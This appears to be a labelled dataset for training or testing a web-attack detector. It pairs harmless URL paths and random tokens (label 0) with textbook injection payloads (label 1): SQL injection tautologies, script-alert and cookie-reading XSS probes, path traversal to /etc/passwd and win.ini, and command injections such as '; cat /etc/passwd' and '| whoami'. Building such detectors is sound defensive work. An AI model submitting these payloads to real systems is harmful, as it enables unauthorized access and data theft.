admin'/* bypass */OR 1=1,1
CRSSXc6bVYMzl,0
s E l E c T * f R o M a d m i n,1
/about?id=4162,0
search,0
javascript:alert(1),1
/user?session=95386,0
<script>alert(document.cookie)</script>,1
/contact?session=61531,0
; cat /etc/passwd,1
' OR 4=4 --,1
s E l E c T * f R o M a d m i n,1
cart,0
user,0
<script>var a=540;alert(a)</script>,1
/search?session=86697,0
/register?session=50552,0
' OR 1=1 --,1
admin' --,1
../../../../etc/passwd,1
' OR 9=6 --,1
../../../../etc/passwd,1
1' o r '1'='1,1
WQyLTsM8q9CEA,0
' OR '1'='1,1
| whoami,1
UwmyY7wf,0
/register?id=7407,0
XDtH7KQ8sV0XpP,0
/home?id=2002,0
| whoami,1
<script>var a=702;alert(a)</script>,1
' OR 7=3 --,1
<script>var a=618;alert(a)</script>,1
settings,0
' OR 6=8 --,1
s E l E c T * f R o M a d m i n,1
hC6jsRmOTN0RY05,0
' OR '1'='1,1
login,0
login,0
' OR 2=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
' OR 9=3 --,1
javascript:alert(1),1
user,0
c4ZzuAY8eNflD0G,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
' OR 6=8 --,1
<script>var a=614;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
MOQbFanQp3mx,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?session=50992,0
/dashboard?id=5019,0
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
pBlN7cqF,0
' OR 5=4 --,1
<script>var a=293;alert(a)</script>,1
<script>var a=594;alert(a)</script>,1
admin' --,1
' OR 1=1 --,1
cart,0
s E l E c T * f R o M a d m i n,1
checkout,0
dashboard,0
<script>alert(document.cookie)</script>,1
user,0
register,0
' OR 6=3 --,1
register,0
<script>var a=409;alert(a)</script>,1
settings,0
' OR 8=6 --,1
' OR '1'='1,1
/dashboard?id=2522,0
' OR 9=5 --,1
oLZ5JlBWiuN7YVV,0
' OR 6=1 --,1
' OR 7=8 --,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
admin' --,1
/profile?session=77404,0
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=4 --,1
/dashboard?session=57781,0
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
<script>var a=544;alert(a)</script>,1
blog,0
/contact?session=47222,0
/search?id=8868,0
' OR 4=9 --,1
/about?id=3143,0
| whoami,1
' OR '1'='1,1
/profile?id=9885,0
/profile?id=5844,0
<script>var a=720;alert(a)</script>,1
/dashboard?session=71189,0
' OR 7=4 --,1
| whoami,1
| whoami,1
login,0
/cart?id=2620,0
blog,0
register,0
aganXDM2k,0
' OR 3=2 --,1
/contact?id=1774,0
SXq5X7cEN7J,0
bbd5D8G8xpm,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?id=5878,0
index,0
/about?session=22003,0
dashboard,0
blog,0
' OR 4=4 --,1
/contact?id=5843,0
admin' --,1
' OR 8=5 --,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?session=74513,0
dashboard,0
contact,0
z8MoFN3xdb,0
| whoami,1
; cat /etc/passwd,1
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
1' o r '1'='1,1
../../../../etc/passwd,1
/user?session=65255,0
register,0
<script>var a=266;alert(a)</script>,1
qmUWtl2shvTsS0L,0
s E l E c T * f R o M a d m i n,1
' OR 4=2 --,1
' OR 1=3 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
' OR 4=1 --,1
/settings?session=33730,0
/login?session=92082,0
' OR 1=8 --,1
/cart?session=51994,0
<script>var a=791;alert(a)</script>,1
/blog?session=67821,0
hoJbhyy39M,0
dashboard,0
javascript:alert(1),1
' OR 7=1 --,1
<script>var a=231;alert(a)</script>,1
' OR 9=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
lRLyzDbA4t,0
/settings?id=1547,0
MpEJJ0tb,0
AOOvfQsJ3dy5K,0
/home?id=1125,0
9lu1JZHul5,0
bGKIIuGhFlxjj,0
<script>var a=833;alert(a)</script>,1
1' o r '1'='1,1
home,0
contact,0
/dashboard?session=73605,0
home,0
g4TO2tEpqsBF2l,0
/about?session=13131,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
' OR 7=8 --,1
/dashboard?session=94138,0
admin' --,1
javascript:alert(1),1
onerror=alert(1),1
1' o r '1'='1,1
| whoami,1
/index?session=35378,0
az2iVVOOu77iod,0
<script>var a=648;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=944;alert(a)</script>,1
<script>var a=142;alert(a)</script>,1
/register?id=4814,0
/cart?session=76839,0
/login?id=2101,0
admin%00' OR 1=1,1
1Wijmlqm,0
' OR 5=2 --,1
' OR 8=6 --,1
Nej97h8AncDT,0
../../../../etc/passwd,1
1' o r '1'='1,1
../../../windows/win.ini,1
/user?session=21526,0
<script>var a=48;alert(a)</script>,1
' OR '1'='1,1
/checkout?id=3737,0
' OR '1'='1,1
; cat /etc/passwd,1
' OR 1=5 --,1
14s7aSBGe,0
3SAtWqFyzyXUGd,0
admin'/* bypass */OR 1=1,1
/search?session=84097,0
/settings?id=2899,0
settings,0
' OR 4=2 --,1
/home?id=2586,0
/user?id=9242,0
dMEUltQQ6Ti,0
../../../windows/win.ini,1
/blog?session=88243,0
../../../../etc/passwd,1
<script>var a=357;alert(a)</script>,1
VTpOXBgCDQNFeK,0
1' o r '1'='1,1
cart,0
1' o r '1'='1,1
7jLxZC4OBKeokT,0
contact,0
search,0
S07HqoiY7jVp,0
b3gbEZpMK,0
| whoami,1
login,0
68Qc3ZwP8E9YN,0
/home?session=80528,0
<script>var a=735;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
bOMX5Vc8,0
/cart?session=93856,0
' OR 9=2 --,1
contact,0
/dashboard?id=4206,0
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=4 --,1
Y8WyG1rXKmZHe,0
<script>var a=883;alert(a)</script>,1
profile,0
index,0
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
<script>var a=767;alert(a)</script>,1
/user?session=69248,0
' OR 1=1 --,1
/contact?id=9972,0
<script>var a=694;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
/checkout?session=47153,0
; cat /etc/passwd,1
login,0
user,0
dashboard,0
' OR 8=5 --,1
search,0
<script>var a=306;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=218;alert(a)</script>,1
settings,0
wLuC6Zb7k,0
/checkout?id=3233,0
/dashboard?session=95221,0
/profile?id=605,0
<script>var a=835;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
XS4Y32WZVCf6aaB,0
/register?session=29682,0
javascript:alert(1),1
' OR '1'='1,1
/dashboard?session=14574,0
<script>var a=163;alert(a)</script>,1
/home?session=22934,0
; cat /etc/passwd,1
<script>var a=796;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
CISKvn1w,0
' OR 2=2 --,1
<script>var a=464;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=228;alert(a)</script>,1
' OR 6=7 --,1
/index?id=6701,0
register,0
/index?id=2657,0
' OR 1=1 --,1
search,0
../../../../etc/passwd,1
javascript:alert(1),1
/home?id=5600,0
/dashboard?id=2511,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=4148,0
admin' --,1
<script>var a=156;alert(a)</script>,1
/contact?session=28339,0
/blog?session=81309,0
cart,0
/search?id=1754,0
profile,0
admin%00' OR 1=1,1
<script>var a=643;alert(a)</script>,1
search,0
<script>var a=453;alert(a)</script>,1
<script>var a=822;alert(a)</script>,1
/cart?id=6063,0
/register?id=6051,0
' OR '1'='1,1
/user?id=1675,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
/user?session=82795,0
javascript:alert(1),1
/checkout?id=7128,0
admin'/* bypass */OR 1=1,1
<script>var a=940;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=180;alert(a)</script>,1
/dashboard?id=6372,0
/search?session=84378,0
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=400;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
' OR 3=8 --,1
about,0
onerror=alert(1),1
cOIanUxjFhfn0U,0
f0b0vx3MP8Q4rQG,0
/login?session=87567,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
/profile?session=82160,0
dBg51bCdzBZQce,0
/dashboard?id=7171,0
<script>var a=883;alert(a)</script>,1
../../../../etc/passwd,1
SjFf5KJTr2KwGg,0
' OR 1=1 --,1
/settings?id=2849,0
/blog?session=60162,0
' OR 1=1 --,1
home,0
th1sLEVLaFWQ,0
' OR '1'='1,1
' OR 1=1 --,1
login,0
/index?session=43283,0
KgGOgms0E,0
<script>var a=615;alert(a)</script>,1
../../../windows/win.ini,1
dashboard,0
about,0
about,0
../../../windows/win.ini,1
search,0
' OR 9=3 --,1
dutkYdLrbOxx,0
ua2unRSf98bM,0
<script>var a=30;alert(a)</script>,1
/home?id=9248,0
' OR '1'='1,1
3prKYlUsXP4Ux,0
koYrbvANK1wf,0
/home?id=1360,0
qpqbgtF7VgDO,0
hP9wbMub9W,0
' OR 3=3 --,1
register,0
<script>var a=365;alert(a)</script>,1
1' o r '1'='1,1
register,0
/login?session=34673,0
WoD1vrsa6P,0
v3nkQsIC7rpw80Q,0
<script>var a=215;alert(a)</script>,1
' OR 4=6 --,1
; cat /etc/passwd,1
../../../../etc/passwd,1
IwqtzXpHi,0
../../../../etc/passwd,1
/about?session=68257,0
' OR 1=1 --,1
/profile?session=98002,0
/index?session=62682,0
/search?session=43052,0
/index?session=94409,0
settings,0
login,0
<script>var a=888;alert(a)</script>,1
/cart?session=75954,0
iCV7YDI991Gcpww,0
/search?id=6687,0
' OR 7=6 --,1
/register?id=599,0
' OR 6=1 --,1
<script>var a=695;alert(a)</script>,1
/contact?id=5913,0
<script>var a=378;alert(a)</script>,1
' OR 6=4 --,1
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=4013,0
/settings?id=9152,0
/login?id=6093,0
ViIKXXmngS,0
' OR '1'='1,1
/user?session=64999,0
javascript:alert(1),1
/search?id=2904,0
/about?id=5706,0
/login?session=94266,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=70167,0
/contact?id=805,0
6q0iaQK0A7,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin' --,1
; cat /etc/passwd,1
/user?session=17566,0
/checkout?session=59476,0
' OR 1=3 --,1
/home?id=763,0
profile,0
' OR 5=5 --,1
admin'/* bypass */OR 1=1,1
' OR 7=4 --,1
/dashboard?session=98638,0
' OR 2=7 --,1
' OR 7=5 --,1
o4eZrfiWo6QD,0
<script>var a=298;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=2 --,1
home,0
/about?id=3651,0
c5Yyfytba,0
/dashboard?session=34583,0
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=78;alert(a)</script>,1
index,0
<script>alert(document.cookie)</script>,1
/login?id=3350,0
' OR 2=7 --,1
admin' --,1
n7kr3tCkI0z1r1I,0
' OR 3=3 --,1
Y5STajV4G5S9r,0
BWlZ0HHMSksR,0
../../../windows/win.ini,1
<script>var a=619;alert(a)</script>,1
OorQqG27lJiIOX,0
/about?id=467,0
61q2dr3SH8,0
; cat /etc/passwd,1
' OR 1=5 --,1
s E l E c T * f R o M a d m i n,1
/settings?id=7225,0
blog,0
/login?id=900,0
' OR 7=2 --,1
' OR '1'='1,1
admin%00' OR 1=1,1
user,0
zrJhgtlrFB0y,0
/profile?id=6871,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
/dashboard?id=9613,0
1' o r '1'='1,1
/index?id=2720,0
' OR 9=1 --,1
' OR 8=1 --,1
QdBDvrpV6O0c,0
admin' --,1
../../../windows/win.ini,1
' OR '1'='1,1
<script>var a=585;alert(a)</script>,1
javascript:alert(1),1
checkout,0
settings,0
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
onerror=alert(1),1
' OR 8=7 --,1
/blog?session=14345,0
about,0
moJa9c71H,0
' OR 3=1 --,1
hKKKITQOvp0KVuT,0
<script>alert(document.cookie)</script>,1
BaadTDne3i,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
JWwP43DqwC,0
g7nsyh886aQDwjI,0
contact,0
settings,0
' OR '1'='1,1
/user?session=77787,0
s E l E c T * f R o M a d m i n,1
/login?session=25310,0
rA3On21fnK7Td,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
B4ZBmEtCii3d,0
' OR '1'='1,1
login,0
<script>var a=272;alert(a)</script>,1
<script>var a=318;alert(a)</script>,1
eQf5Hn3lNJ1,0
toeJTDb8S,0
| whoami,1
W7q3DBntd7js,0
| whoami,1
/profile?id=8806,0
| whoami,1
ZFkwGUvrwHB,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cHY0srp3EZD,0
MetX04C6pOF,0
' OR 4=9 --,1
javascript:alert(1),1
/index?session=67278,0
/blog?session=99327,0
s E l E c T * f R o M a d m i n,1
admin' --,1
' OR 8=9 --,1
javascript:alert(1),1
/login?id=8880,0
/register?id=9266,0
javascript:alert(1),1
<script>var a=916;alert(a)</script>,1
/blog?id=9198,0
search,0
<script>var a=882;alert(a)</script>,1
wYBA82bA,0
/user?session=73377,0
admin%00' OR 1=1,1
/user?id=8532,0
| whoami,1
/dashboard?session=97129,0
profile,0
1' o r '1'='1,1
o2wawBQk,0
home,0
<script>var a=846;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=339;alert(a)</script>,1
/home?session=24356,0
dashboard,0
' OR 9=5 --,1
admin' --,1
javascript:alert(1),1
/cart?session=15013,0
/blog?id=8948,0
' OR 2=5 --,1
' OR 7=7 --,1
/login?id=3143,0
<script>var a=188;alert(a)</script>,1
/user?session=50279,0
checkout,0
/search?session=67028,0
/settings?id=5382,0
/contact?id=6690,0
/checkout?id=3846,0
' OR 8=7 --,1
<script>var a=895;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=713;alert(a)</script>,1
../../../../etc/passwd,1
settings,0
../../../windows/win.ini,1
' OR '1'='1,1
MVUJIKpye,0
' OR 7=4 --,1
/blog?id=511,0
/dashboard?id=3278,0
admin'/* bypass */OR 1=1,1
/cart?session=40538,0
J5FIE7ew,0
onerror=alert(1),1
/register?id=9895,0
bhvvuoyP2U7,0
' OR 7=3 --,1
/login?session=43661,0
index,0
/contact?session=97616,0
<script>var a=803;alert(a)</script>,1
checkout,0
register,0
/settings?session=41077,0
/contact?id=445,0
/home?id=9902,0
<script>var a=260;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
FcLKsAq8jzUaIm,0
/index?session=39602,0
' OR 1=1 --,1
' OR 5=6 --,1
' OR 5=9 --,1
MvZPx2pBR,0
contact,0
/settings?session=54523,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=733;alert(a)</script>,1
/cart?session=56685,0
onerror=alert(1),1
<script>var a=60;alert(a)</script>,1
DFKcOs7tntrRWUV,0
/cart?session=70465,0
admin'/* bypass */OR 1=1,1
lVQmUkayDJ2ZMr,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
/contact?id=2011,0
<script>var a=918;alert(a)</script>,1
/search?session=76551,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
admin' --,1
/profile?session=75243,0
/user?session=77153,0
home,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=3 --,1
1' o r '1'='1,1
' OR 1=8 --,1
| whoami,1
/contact?session=32563,0
../../../../etc/passwd,1
hMNlZbzzAeAC,0
contact,0
/search?id=1166,0
AvupuK1gzr5fy,0
Rbt8WY8XbAc,0
; cat /etc/passwd,1
/blog?session=26208,0
' OR 8=8 --,1
admin%00' OR 1=1,1
' OR 5=2 --,1
0RJ2zgr1,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
/home?session=43144,0
<script>var a=57;alert(a)</script>,1
' OR '1'='1,1
MZBttT8bBbbL6E,0
admin%00' OR 1=1,1
| whoami,1
login,0
Ffl2daPbHxwrLA,0
s E l E c T * f R o M a d m i n,1
/blog?session=57796,0
/register?session=34645,0
dashboard,0
/dashboard?id=2610,0
dashboard,0
admin' --,1
onerror=alert(1),1
/checkout?session=98038,0
home,0
admin%00' OR 1=1,1
/user?session=87028,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
c9PAaiukr,0
/settings?id=5306,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
s E l E c T * f R o M a d m i n,1
user,0
<script>alert(document.cookie)</script>,1
/dashboard?session=94590,0
| whoami,1
/about?id=1390,0
xezfX1CTVQlZ6,0
' OR 2=3 --,1
VZWt5XYziaKEBY,0
cart,0
onerror=alert(1),1
/login?session=66187,0
' OR 6=4 --,1
' OR 3=1 --,1
javascript:alert(1),1
onerror=alert(1),1
' OR 7=7 --,1
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?session=40919,0
admin%00' OR 1=1,1
' OR 6=3 --,1
home,0
' OR 6=8 --,1
/blog?session=24216,0
/contact?id=2359,0
; cat /etc/passwd,1
login,0
CKMIWqiSxdtcI,0
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=670;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/blog?session=45325,0
' OR 9=8 --,1
/settings?id=8486,0
checkout,0
../../../windows/win.ini,1
<script>var a=101;alert(a)</script>,1
ZG2HGKalWcHZaLS,0
| whoami,1
<script>var a=320;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
<script>var a=317;alert(a)</script>,1
<script>var a=977;alert(a)</script>,1
<script>var a=437;alert(a)</script>,1
admin' --,1
register,0
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
' OR 7=7 --,1
user,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?session=48903,0
| whoami,1
checkout,0
zSsWEGjcMRNeG0b,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
home,0
/blog?session=70358,0
' OR 1=1 --,1
register,0
<script>var a=252;alert(a)</script>,1
login,0
' OR 3=5 --,1
' OR 1=1 --,1
<script>var a=686;alert(a)</script>,1
search,0
/home?id=1728,0
/checkout?id=3539,0
<script>var a=248;alert(a)</script>,1
<script>var a=403;alert(a)</script>,1
' OR 6=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
B0MMadXcmTKKO,0
N0rVqmKex1Nm9,0
search,0
| whoami,1
' OR 8=7 --,1
admin%00' OR 1=1,1
1' o r '1'='1,1
/login?session=68272,0
/user?session=43212,0
dashboard,0
profile,0
index,0
<script>alert(document.cookie)</script>,1
user,0
ga7VMyErLR,0
' OR '1'='1,1
<script>var a=349;alert(a)</script>,1
; cat /etc/passwd,1
' OR 6=7 --,1
' OR 6=7 --,1
/login?session=49718,0
| whoami,1
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
/profile?session=68520,0
Ex5tGSzBPfmLwN,0
admin' --,1
' OR 1=1 --,1
vCQ1bdl0w,0
1' o r '1'='1,1
<script>var a=629;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 6=9 --,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
<script>var a=223;alert(a)</script>,1
hJdVhDoLf,0
../../../../etc/passwd,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
javascript:alert(1),1
<script>var a=878;alert(a)</script>,1
/register?id=187,0
<script>var a=174;alert(a)</script>,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
blog,0
../../../../etc/passwd,1
' OR 2=8 --,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
/cart?session=39215,0
<script>var a=38;alert(a)</script>,1
' OR 7=8 --,1
profile,0
onerror=alert(1),1
' OR 7=4 --,1
Nc5HtcOmXfS,0
<script>var a=882;alert(a)</script>,1
contact,0
admin%00' OR 1=1,1
javascript:alert(1),1
; cat /etc/passwd,1
RWfHnYf4WYzjCw,0
/login?id=4858,0
checkout,0
/settings?id=7206,0
../../../../etc/passwd,1
0Yf84j0dy,0
/cart?session=84634,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
KDR7GXgadtvrax,0
../../../windows/win.ini,1
/blog?session=21091,0
/search?session=12628,0
/dashboard?id=8545,0
/login?session=79675,0
admin' --,1
/register?session=78857,0
| whoami,1
/home?session=43981,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
contact,0
' OR 1=1 --,1
/checkout?session=51834,0
/settings?id=5782,0
/login?session=78005,0
<script>var a=528;alert(a)</script>,1
' OR 4=7 --,1
/contact?id=1679,0
/dashboard?id=2798,0
javascript:alert(1),1
/cart?session=87293,0
s E l E c T * f R o M a d m i n,1
/profile?id=7013,0
| whoami,1
../../../windows/win.ini,1
/cart?session=30733,0
/search?session=11159,0
s E l E c T * f R o M a d m i n,1
gOqdUsImkV,0
; cat /etc/passwd,1
HatsfX3E,0
/dashboard?session=85621,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
<script>var a=510;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
TQeybPyX,0
<script>var a=380;alert(a)</script>,1
' OR 5=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?session=32006,0
9jVfRrfuo,0
javascript:alert(1),1
admin%00' OR 1=1,1
admin%00' OR 1=1,1
/profile?id=984,0
A1iyyFgW,0
../../../../etc/passwd,1
<script>var a=753;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=694;alert(a)</script>,1
' OR 2=6 --,1
/contact?session=75071,0
HtBJFnr4g,0
login,0
/about?session=59276,0
login,0
../../../../etc/passwd,1
/about?session=88579,0
' OR 7=7 --,1
' OR 1=8 --,1
checkout,0
/cart?session=54814,0
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?id=3135,0
/about?session=91284,0
' OR 2=7 --,1
<script>var a=553;alert(a)</script>,1
/dashboard?session=51901,0
/login?session=83448,0
' OR 5=6 --,1
/index?session=25614,0
/user?id=288,0
' OR 3=7 --,1
/about?session=19583,0
tAk9XtLg,0
' OR '1'='1,1
/profile?id=3101,0
javascript:alert(1),1
; cat /etc/passwd,1
<script>var a=730;alert(a)</script>,1
<script>var a=774;alert(a)</script>,1
profile,0
onerror=alert(1),1
/home?session=63991,0
s E l E c T * f R o M a d m i n,1
admin' --,1
; cat /etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
9M0QIkf9faLCz,0
login,0
' OR 2=1 --,1
' OR 2=2 --,1
' OR 5=2 --,1
NYnR54MI2w,0
dashboard,0
' OR '1'='1,1
s E l E c T * f R o M a d m i n,1
/cart?id=3244,0
<script>var a=241;alert(a)</script>,1
/login?id=1716,0
QJFiXO13Tu6QGwR,0
<script>var a=553;alert(a)</script>,1
../../../../etc/passwd,1
| whoami,1
<script>var a=406;alert(a)</script>,1
<script>var a=806;alert(a)</script>,1
/about?session=72993,0
contact,0
admin' --,1
aLf9XVSF2lmPfsX,0
/home?id=2993,0
<script>var a=554;alert(a)</script>,1
/checkout?session=64580,0
admin%00' OR 1=1,1
/checkout?session=30643,0
/checkout?id=1185,0
' OR 3=5 --,1
/profile?session=38515,0
/checkout?session=28542,0
profile,0
../../../windows/win.ini,1
XPUJsxhzlVOpQv,0
<script>var a=224;alert(a)</script>,1
javascript:alert(1),1
/contact?session=10233,0
../../../windows/win.ini,1
checkout,0
| whoami,1
<script>var a=222;alert(a)</script>,1
/home?id=1994,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 9=1 --,1
checkout,0
dashboard,0
admin%00' OR 1=1,1
/profile?id=6533,0
/blog?session=27816,0
../../../windows/win.ini,1
1' o r '1'='1,1
HTZkiMG3v,0
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
/login?id=8015,0
cart,0
' OR 9=2 --,1
admin' --,1
RpvLEAkVtF,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/contact?id=8709,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=9720,0
<script>var a=894;alert(a)</script>,1
' OR '1'='1,1
register,0
admin' --,1
<script>var a=311;alert(a)</script>,1
index,0
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
<script>var a=755;alert(a)</script>,1
' OR '1'='1,1
admin%00' OR 1=1,1
' OR 7=2 --,1
xWWihhAvC1abn,0
/dashboard?session=27330,0
settings,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
V9w3PFU0Clcq,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
/cart?id=9035,0
85mjDDj97j,0
/dashboard?id=6154,0
' OR 8=3 --,1
/profile?session=34755,0
cart,0
admin%00' OR 1=1,1
/login?session=71274,0
../../../windows/win.ini,1
1' o r '1'='1,1
1' o r '1'='1,1
<script>var a=872;alert(a)</script>,1
onerror=alert(1),1
HVjV427vodQmqM,0
' OR 7=7 --,1
s E l E c T * f R o M a d m i n,1
' OR 7=3 --,1
admin%00' OR 1=1,1
' OR '1'='1,1
rNkvsQkGQBbTaVx,0
xjt0nbx013,0
admin'/* bypass */OR 1=1,1
' OR 7=7 --,1
' OR 1=1 --,1
/login?id=7984,0
cm9X4rnIvAJvanL,0
<script>var a=238;alert(a)</script>,1
javascript:alert(1),1
4aLqOLvSWO,0
<script>var a=905;alert(a)</script>,1
<script>var a=214;alert(a)</script>,1
/search?id=9115,0
<script>var a=293;alert(a)</script>,1
onerror=alert(1),1
7ZIV4NueZ4G,0
bfSd8yzdDG,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
rUqSrrrHqYmD,0
profile,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
/profile?id=589,0
<script>var a=437;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
settings,0
' OR 7=2 --,1
/index?id=1042,0
onerror=alert(1),1
../../../windows/win.ini,1
/blog?session=61752,0
/dashboard?session=20258,0
/user?id=3307,0
O1bNFUTPHPfqIR,0
/search?session=14749,0
/checkout?session=19036,0
admin'/* bypass */OR 1=1,1
/about?session=84510,0
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
<script>var a=916;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
s E l E c T * f R o M a d m i n,1
search,0
/about?id=8736,0
yUzioImmPopAdc,0
1' o r '1'='1,1
../../../../etc/passwd,1
' OR 9=8 --,1
QbtkXmNi,0
<script>var a=763;alert(a)</script>,1
/contact?session=39363,0
contact,0
aFySBsd9rynVR2,0
' OR '1'='1,1
/cart?id=721,0
/blog?session=33592,0
' OR 1=1 --,1
home,0
/search?id=7918,0
s E l E c T * f R o M a d m i n,1
search,0
admin' --,1
/settings?id=6530,0
/user?id=8409,0
' OR '1'='1,1
/settings?id=5086,0
/cart?session=54684,0
<script>var a=235;alert(a)</script>,1
settings,0
hvYE3CrBnqoh,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=35166,0
../../../../etc/passwd,1
bNjkLWXL1oCsX,0
' OR 1=1 --,1
' OR '1'='1,1
/settings?session=44350,0
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
<script>var a=729;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR 5=6 --,1
/blog?id=8563,0
1MXefkMwB0uP2,0
' OR 8=1 --,1
blog,0
' OR 1=9 --,1
Kxl7oWLT,0
' OR 1=1 --,1
/login?session=46319,0
dashboard,0
' OR 5=9 --,1
/checkout?id=9636,0
/home?session=84086,0
' OR 4=5 --,1
/checkout?id=7209,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
' OR 6=9 --,1
pz244QjVFN,0
<script>var a=65;alert(a)</script>,1
/contact?session=46208,0
/profile?session=86707,0
/checkout?session=42110,0
/cart?id=1746,0
D13gWd73XE0CX,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
91YwcamHJVNOTq,0
h3g13fmGC,0
' OR 1=1 --,1
/blog?id=8725,0
admin%00' OR 1=1,1
vnEk007zsRWxT,0
register,0
dashboard,0
/register?session=80027,0
../../../../etc/passwd,1
' OR 3=8 --,1
<script>var a=353;alert(a)</script>,1
javascript:alert(1),1
/login?id=6675,0
/register?session=80264,0
/checkout?session=49311,0
